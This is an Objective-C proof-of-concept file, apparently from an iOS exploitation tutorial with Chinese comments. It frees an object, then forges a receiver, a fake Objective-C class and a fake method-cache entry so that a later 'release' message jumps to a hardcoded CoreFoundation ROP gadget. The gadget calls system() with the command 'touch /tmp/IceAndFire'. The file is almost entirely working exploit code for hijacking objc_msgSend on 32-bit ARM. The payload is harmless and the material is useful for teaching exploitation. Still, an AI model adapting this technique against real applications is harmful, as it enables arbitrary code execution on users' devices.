#import "Talker.h"
#include <dlfcn.h>
#include <mach-o/dyld_images.h>
#include <objc/runtime.h>

struct fake_receiver_t
{
    uint32_t fake_objc_class_ptr;
    uint8_t pad1[0x44-0x4];
    uint32_t r0;             //确保此处的值付给r0
    uint8_t pad2[0x58-0x44-0x4];
    uint32_t r1;
    char cmd[1024];
}fake_receiver;

struct fake_objc_class_t {
    char pad[0x8];
    void* cache_buckets_ptr;
    uint32_t cache_bucket_mask;
} fake_objc_class;

struct fake_cache_bucket_t {
    void* cached_sel;
    void* cached_function;
} fake_cache_bucket;

void* find_library_load_address(const char* library_name){
    kern_return_t err;
    
    task_dyld_info_data_t task_dyld_info;
    mach_msg_type_number_t count = TASK_DYLD_INFO_COUNT;
    err = task_info(mach_task_self(), TASK_DYLD_INFO, (task_info_t)&task_dyld_info, &count);
    
    const struct dyld_all_image_infos* all_image_infos = (const struct dyld_all_image_infos*)task_dyld_info.all_image_info_addr;
    const struct dyld_image_info* image_infos = all_image_infos->infoArray;
    
    for(size_t i = 0; i < all_image_infos->infoArrayCount; i++){
        const char* image_name = image_infos[i].imageFilePath;
        mach_vm_address_t image_load_address = (mach_vm_address_t)image_infos[i].imageLoadAddress;
        if (strstr(image_name, library_name)){
            return (void*)image_load_address;
        }
    }
    
}

int main(void) {
    
    Talker *talker = [[Talker alloc] init];
    [talker say: @"Hello, Ice and Fire!"];
    [talker say: @"Hello, Ice and Fire!"];
    
    [talker release];

    fake_cache_bucket.cached_sel = (void*) NSSelectorFromString(@"release");
    NSLog(@"cached_sel = %p", NSSelectorFromString(@"release"));

    uint8_t* CoreFoundation_base = find_library_load_address("CoreFoundation");
    NSLog(@"CoreFoundationbase address = %p", (void*)CoreFoundation_base);
    
    //0x2d4512a4 : mov r1, r0 ; ldr r0, [r1, #0x44] ; ldr r1, [r1, #0x58] ; cmp r1, #0 ; it eq ; bxeq lr ; bx r1
    //thumb 汇编，需要+1
    fake_cache_bucket.cached_function = (void*)CoreFoundation_base + 0x2d4512a4 - 0x2d3b3000 + 1;
    NSLog(@"fake_cache_bucket.cached_function = %p", (void*)fake_cache_bucket.cached_function);

    fake_receiver.r0=(uint64_t)&fake_receiver.cmd;
    fake_receiver.r1=(void *)dlsym(RTLD_DEFAULT, "system");
    NSLog(@"system_address = %p", (void*)fake_receiver.r1);
    strcpy(fake_receiver.cmd, "touch /tmp/IceAndFire");
    
    fake_objc_class.cache_buckets_ptr = &fake_cache_bucket;
    fake_objc_class.cache_bucket_mask=0;
    
    fake_receiver.fake_objc_class_ptr=&fake_objc_class;
    talker= &fake_receiver;
    NSLog(@"fake_receiver address = %p", &fake_receiver);
    
    [talker release];
    
}